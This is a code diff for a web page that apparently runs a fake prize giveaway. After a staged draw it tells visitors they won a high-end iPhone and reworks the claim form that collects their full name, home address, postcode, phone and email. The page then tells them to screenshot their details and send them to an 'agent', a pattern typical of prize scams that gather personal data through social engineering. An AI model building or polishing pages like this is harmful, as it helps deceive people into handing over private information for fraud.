@@ -273,155 +273,181 @@
 </script>  
 
 <script>
-/* ====== Claim Flow (Modal, No-Nested-Form, Mobile-friendly) ====== */
-(function installClaimFlowModal(){
-  if (window.__CLAIM_FLOW_MODAL__) return;
-  window.__CLAIM_FLOW_MODAL__ = true;
+/* ===== Flat Claim Page (non-modal; typeable; submit + big confirmation) ===== */
+(function installFlatClaim(){
+  if (window.__CLAIM_FLOW_FLAT__) return;
+  window.__CLAIM_FLOW_FLAT__ = true;
 
   const PRIZE_NAME = "iPhone 17 Pro Max - 2TB";
 
-  // ---------- Styles (modal + inputs) ----------
+  // ---------- Styles: mobile-friendly; ensures inputs are interactive ----------
   const style = document.createElement('style');
   style.textContent = `
-  /* overlay sits on top of everything */
-  #claimOverlay{position:fixed;inset:0;z-index:2147483647;display:none;
-    background:rgba(10,15,26,.76);backdrop-filter:blur(6px);}
-  #claimModal{position:absolute;inset:auto auto 0 0;right:0;left:0;top:0;bottom:auto;
-    margin:auto;max-width:min(760px,94vw);max-height:92vh;overflow:auto;
-    background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.18);
-    border-radius:22px;padding:20px 18px;color:#e6f4ff;box-shadow:0 20px 50px rgba(0,0,0,.45)}
-  .title{font-size:20px;font-weight:900;margin:0 0 10px}
-  .sub{opacity:.9;margin:2px 0 16px}
-  .grid{display:grid;grid-template-columns:1fr;gap:12px}
-  .field{display:flex;flex-direction:column;gap:6px}
-  .field label{font-size:14px;opacity:.95}
-  .field input{padding:12px;border-radius:12px;border:1px solid rgba(255,255,255,.2);
-    background:rgba(255,255,255,.08);color:inherit;font-size:16px;outline:none}
-  .actions{display:flex;flex-direction:column;gap:10px;margin-top:14px}
-  .btn{display:inline-flex;align-items:center;justify-content:center;width:100%;
-    padding:14px 16px;border-radius:14px;border:0;cursor:pointer;font-weight:800;font-size:16px}
-  .btn:active{transform:scale(.99)}
-  .btn-primary{background:var(--gold,#ffe066);color:#111}
-  .btn-ghost{background:transparent;border:1px solid rgba(255,255,255,.28);color:inherit}
-  .spinner{width:44px;height:44px;border-radius:50%;border:3px solid rgba(255,255,255,.28);
-    border-top-color:var(--gold,#ffe066);animation:spin 1s linear infinite;margin:20px auto}
-  @keyframes spin{to{transform:rotate(360deg)}}
-  .confirm-big{font-size:clamp(22px,5vw,32px);font-weight:900;text-align:center;margin:6px 0 10px}
-  .confirm-hint{font-size:clamp(18px,4vw,26px);font-weight:900;text-align:center;color:var(--gold,#ffe066);margin:6px 0 16px}
-  .summary{font-size:18px;line-height:1.7;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.18);border-radius:16px;padding:14px 12px}
-  .summary .row{display:flex;gap:10px}
-  .summary .row b{min-width:180px}
+    #claimFlat{position:relative;z-index:9999;display:none;margin:20px auto;max-width:min(760px,94vw);
+      background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.15);border-radius:20px;
+      padding:20px 18px;color:#e6f4ff}
+    #claimFlat, #claimFlat *{pointer-events:auto !important;-webkit-user-select:text !important;user-select:text !important}
+    #claimFlat .title{font-size:20px;font-weight:900;margin:0 0 10px}
+    #claimFlat .sub{opacity:.9;margin:2px 0 16px}
+    #claimFlat .grid{display:grid;grid-template-columns:1fr;gap:12px}
+    #claimFlat .field{display:flex;flex-direction:column;gap:6px}
+    #claimFlat .field label{font-size:14px;opacity:.95}
+    #claimFlat .field input{padding:12px;border-radius:12px;border:1px solid rgba(255,255,255,.2);
+      background:rgba(255,255,255,.08);color:inherit;font-size:16px;outline:none}
+    #claimFlat .actions{display:flex;flex-direction:column;gap:10px;margin-top:14px}
+    #claimFlat .btn{display:inline-flex;align-items:center;justify-content:center;width:100%;
+      padding:14px 16px;border-radius:14px;border:0;cursor:pointer;font-weight:800;font-size:16px}
+    #claimFlat .btn:active{transform:scale(.99)}
+    #claimFlat .btn-primary{background:var(--gold,#ffe066);color:#111}
+    #claimFlat .btn-ghost{background:transparent;border:1px solid rgba(255,255,255,.28);color:inherit}
+    #claimFlat .error{border-color:#ff6b6b !important}
+    #claimFlat .hint-err{color:#ff6b6b;font-size:14px;margin-top:-4px}
+    #claimFlat .spinner{width:44px;height:44px;border-radius:50%;border:3px solid rgba(255,255,255,.28);
+      border-top-color:var(--gold,#ffe066);animation:spin 1s linear infinite;margin:20px auto}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    #claimFlat .confirm-big{font-size:clamp(22px,5vw,32px);font-weight:900;text-align:center;margin:6px 0 10px}
+    #claimFlat .confirm-hint{font-size:clamp(18px,4.2vw,26px);font-weight:900;text-align:center;color:var(--gold,#ffe066);margin:6px 0 16px}
+    #claimFlat .summary{font-size:18px;line-height:1.7;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.18);
+      border-radius:16px;padding:14px 12px}
+    #claimFlat .summary .row{display:flex;gap:10px}
+    #claimFlat .summary .row b{min-width:180px}
   `;
   document.head.appendChild(style);
 
+  // ---------- Helpers ----------
   const $ = s => document.querySelector(s);
   const $id = s => document.getElementById(s);
-  const body = document.body;
-  let scrollLock = null;
 
-  // ---------- Continue button injection under your result box ----------
   function getResultBox(){
     return $id('resultBox') || $('.result-box') || (typeof prizeText!=='undefined' ? prizeText.parentElement : null);
   }
+
+  // ---------- 1) Inject "Continue" under result (flat view) ----------
+  let continueBtn;
   function injectContinue(){
     try{
       if (typeof ONE_TIME_KEY!=='undefined' && localStorage.getItem(ONE_TIME_KEY)==='1') return;
     }catch(e){}
     const box = getResultBox(); if (!box || box.querySelector('.continue-btn')) return;
-    const btn = document.createElement('button');
-    btn.className = 'btn btn-primary continue-btn';
-    btn.type = 'button';
-    btn.textContent = 'Continue';
-    btn.style.marginTop = '12px';
-    btn.addEventListener('click', openModal);
-    box.appendChild(btn);
+    continueBtn = document.createElement('button');
+    continueBtn.className = 'btn btn-primary continue-btn';
+    continueBtn.type = 'button';
+    continueBtn.textContent = 'Continue';
+    continueBtn.style.marginTop = '12px';
+    continueBtn.addEventListener('click', showFlat);
+    box.appendChild(continueBtn);
   }
   if (typeof drawBtn!=='undefined' && drawBtn){
     drawBtn.addEventListener('click', ()=>{ setTimeout(injectContinue, 2300); setTimeout(injectContinue, 3000); });
   }
   setTimeout(injectContinue, 800);
 
-  // ---------- Modal skeleton (no <form> to avoid nesting issues) ----------
-  const overlay = document.createElement('div');
-  overlay.id = 'claimOverlay';
-  overlay.innerHTML = `
-    <div id="claimModal" role="dialog" aria-modal="true" aria-labelledby="claimTitle">
-      <div class="title" id="claimTitle">Please fill in your payout information</div>
-      <div class="sub">Make sure all details are correct.</div>
+  // ---------- 2) Build flat page section (no <form> to avoid nesting conflicts) ----------
+  if ($id('claimFlat')) return;
+  const flat = document.createElement('section');
+  flat.id = 'claimFlat';
+  flat.innerHTML = `
+    <div class="title">Please fill in your payout information</div>
+    <div class="sub">Make sure all details are correct.</div>
 
-      <div id="claimForm" role="form" class="grid">
-        <div class="field">
-          <label>Prize won</label>
-          <input id="f_prize" type="text" value="${PRIZE_NAME}" readonly aria-readonly="true">
-        </div>
-        <div class="field">
-          <label>Recipient's name</label>
-          <input id="f_name" type="text" placeholder="Full name" autocomplete="name" data-required>
-        </div>
-        <div class="field">
-          <label>Street address</label>
-          <input id="f_address" type="text" placeholder="House number and street" autocomplete="address-line1" data-required>
-        </div>
-        <div class="field">
-          <label>Town/city</label>
-          <input id="f_city" type="text" placeholder="Town or city" autocomplete="address-level2" data-required>
-        </div>
-        <div class="field">
-          <label>Postcode</label>
-          <input id="f_postcode" type="text" placeholder="e.g. M1 1AE" autocomplete="postal-code" data-required>
-        </div>
-        <div class="field">
-          <label>Contact telephone number</label>
-          <input id="f_phone" type="tel" placeholder="+44..." autocomplete="tel" data-required>
-        </div>
-        <div class="field">
-          <label>Your email address</label>
-          <input id="f_email" type="email" placeholder="name@example.com" autocomplete="email" data-required>
-        </div>
-
-        <div class="actions">
-          <button id="submitClaim" class="btn btn-primary" type="button">Confirm & Submit</button>
-          <button id="backToResult" class="btn btn-ghost" type="button">Back</button>
-        </div>
+    <div id="flatForm" role="form" class="grid">
+      <div class="field">
+        <label>Prize won</label>
+        <input id="f_prize" type="text" value="${PRIZE_NAME}" readonly aria-readonly="true">
       </div>
-
-      <div id="claimLoading" style="display:none;text-align:center">
-        <div class="spinner" aria-hidden="true"></div>
-        <div>Submitting, please wait…</div>
+      <div class="field">
+        <label for="f_name">Recipient's name</label>
+        <input id="f_name" type="text" placeholder="Full name" autocomplete="name" data-required>
+        <div class="hint-err" id="e_name" style="display:none">Please enter your full name.</div>
       </div>
+      <div class="field">
+        <label for="f_address">Street address</label>
+        <input id="f_address" type="text" placeholder="House number and street" autocomplete="address-line1" data-required>
+        <div class="hint-err" id="e_address" style="display:none">Please enter your street address.</div>
+      </div>
+      <div class="field">
+        <label for="f_city">Town/city</label>
+        <input id="f_city" type="text" placeholder="Town or city" autocomplete="address-level2" data-required>
+        <div class="hint-err" id="e_city" style="display:none">Please enter your town/city.</div>
+      </div>
+      <div class="field">
+        <label for="f_postcode">Postcode</label>
+        <input id="f_postcode" type="text" placeholder="e.g. M1 1AE" autocomplete="postal-code" data-required>
+        <div class="hint-err" id="e_postcode" style="display:none">Please enter your postcode.</div>
+      </div>
+      <div class="field">
+        <label for="f_phone">Contact telephone number</label>
+        <input id="f_phone" type="tel" placeholder="+44..." autocomplete="tel" data-required>
+        <div class="hint-err" id="e_phone" style="display:none">Please enter your phone number.</div>
+      </div>
+      <div class="field">
+        <label for="f_email">Your email address</label>
+        <input id="f_email" type="email" placeholder="name@example.com" autocomplete="email" data-required>
+        <div class="hint-err" id="e_email" style="display:none">Please enter a valid email.</div>
+      </div>
+      <div class="actions">
+        <button id="flatSubmit" class="btn btn-primary" type="button">Confirm & Submit</button>
+        <button id="flatBack" class="btn btn-ghost" type="button">Back</button>
+      </div>
+    </div>
 
-      <div id="claimConfirm" style="display:none">
-        <div class="confirm-big">Submission received</div>
-        <div class="confirm-hint">Please screenshot this page and send it to your agent.</div>
-        <div class="summary" id="confirmSummary"></div>
-        <div class="actions" style="margin-top:16px">
-          <button id="doneBtn" class="btn btn-ghost" type="button">Done</button>
-        </div>
+    <div id="flatLoading" style="display:none;text-align:center">
+      <div class="spinner" aria-hidden="true"></div>
+      <div>Submitting, please wait…</div>
+    </div>
+
+    <div id="flatConfirm" style="display:none">
+      <div class="confirm-big">Submission received</div>
+      <div class="confirm-hint">Please screenshot this page and send it to your agent.</div>
+      <div class="summary" id="confirmSummary"></div>
+      <div class="actions" style="margin-top:16px">
+        <button id="flatDone" class="btn btn-ghost" type="button">Done</button>
       </div>
     </div>
   `;
-  body.appendChild(overlay);
+  document.body.appendChild(flat);
 
-  // ---------- Modal open/close ----------
-  function openModal(){
-    // hide main blocks just in case（避免覆盖）
-    ['gallery','gate','resultBox','loading'].forEach(id=>{ const el=$id(id); if(el) el.style.pointerEvents='none'; });
-    overlay.style.display = 'block';
-    scrollLock = { html: document.documentElement.style.overflow, body: body.style.overflow };
-    document.documentElement.style.overflow = 'hidden';
-    body.style.overflow = 'hidden';
-    setTimeout(()=>{ $id('f_name')?.focus(); }, 30);
+  // ---------- Show/Hide ----------
+  function hideMain(){
+    ['gallery','gate','resultBox','loading'].forEach(id => { const el=$id(id); if (el) el.style.display='none'; });
+    if (continueBtn) continueBtn.style.display = 'none';
+    document.body.style.pointerEvents = 'auto';
   }
-  function closeModal(){
-    overlay.style.display = 'none';
-    document.documentElement.style.overflow = scrollLock?.html || '';
-    body.style.overflow = scrollLock?.body || '';
-    ['gallery','gate','resultBox','loading'].forEach(id=>{ const el=$id(id); if(el) el.style.pointerEvents=''; });
+  function showMain(){
+    const rb=$id('resultBox'); if (rb) rb.style.display='block';
+    if (continueBtn) continueBtn.style.display='inline-flex';
   }
-  overlay.querySelector('#backToResult').addEventListener('click', closeModal);
-  overlay.querySelector('#doneBtn').addEventListener('click', closeModal);
+  function showFlat(){
+    hideMain();
+    flat.style.display='block';
+    window.scrollTo({ top: flat.offsetTop - 10, behavior: 'smooth' });
+    setTimeout(()=>{ $id('f_name')?.focus(); }, 50);
+  }
 
-  // ---------- Validate & Submit (no native form) ----------
+  $id('flatBack').addEventListener('click', ()=>{
+    flat.style.display='none';
+    showMain();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
+
+  // ---------- Validate & Submit ----------
+  function val(id, test){
+    const el = $id(id), err = $id('e_'+id.split('_')[1]);
+    const ok = test(el.value.trim());
+    el.classList.toggle('error', !ok);
+    if (err) err.style.display = ok ? 'none' : 'block';
+    return ok;
+  }
+  function validate(){
+    let ok = true;
+    ok = val('f_name', v => v.length>=2) && ok;
+    ok = val('f_address', v => v.length>=3) && ok;
+    ok = val('f_city', v => v.length>=2) && ok;
+    ok = val('f_postcode', v => v.length>=2) && ok;
+    ok = val('f_phone', v => v.length>=5) && ok;
+    ok = val('f_email', v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) && ok;
+    return ok;
+  }
   function getData(){
     return {
       name: $id('f_name').value.trim(),
@@ -432,30 +458,17 @@
       email: $id('f_email').value.trim()
     };
   }
-  function validate(){
-    let ok = true;
-    overlay.querySelectorAll('[data-required]').forEach(inp=>{
-      if(!inp.value.trim()){ inp.style.borderColor = '#ff6b6b'; ok=false; }
-      else { inp.style.borderColor = 'rgba(255,255,255,.2)'; }
-    });
-    // 简单 email 规则
-    const em = $id('f_email'); if (em.value && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em.value)) {
-      em.style.borderColor = '#ff6b6b'; ok=false;
-    }
-    return ok;
-  }
+  function escapeHtml(str){return String(str).replace(/[&<>"']/g, s => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[s]))}
 
-  $id('submitClaim').addEventListener('click', ()=>{
-    if(!validate()) return;
-
-    // show loading
-    $id('claimForm').style.display = 'none';
-    $id('claimLoading').style.display = 'block';
+  $id('flatSubmit').addEventListener('click', ()=>{
+    if (!validate()) return;
+    $id('flatForm').style.display='none';
+    $id('flatLoading').style.display='block';
 
     setTimeout(()=>{
       const d = getData();
-      $id('claimLoading').style.display = 'none';
-      $id('claimConfirm').style.display = 'block';
+      $id('flatLoading').style.display='none';
+      $id('flatConfirm').style.display='block';
       $id('confirmSummary').innerHTML = `
         <div class="row"><b>Prize won:</b><span>${PRIZE_NAME}</span></div>
         <div class="row"><b>Recipient's name:</b><span>${escapeHtml(d.name)}</span></div>
@@ -465,14 +478,19 @@
         <div class="row"><b>Contact telephone number:</b><span>${escapeHtml(d.phone)}</span></div>
         <div class="row"><b>Your email address:</b><span>${escapeHtml(d.email)}</span></div>
       `;
-      // big confirmation shown with hint:
-      // "Please screenshot this page and send it to your agent."
-    }, 1100);
+      window.scrollTo({ top: flat.offsetTop - 10, behavior: 'smooth' });
+    }, 1000);
   });
 
-  function escapeHtml(str){return String(str).replace(/[&<>"']/g,s=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[s]))}
+  $id('flatDone').addEventListener('click', ()=>{
+    $id('flatConfirm').style.display='none';
+    flat.style.display='none';
+    showMain();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
+
 })();
 </script>
-      
+    
 </body>
 </html>
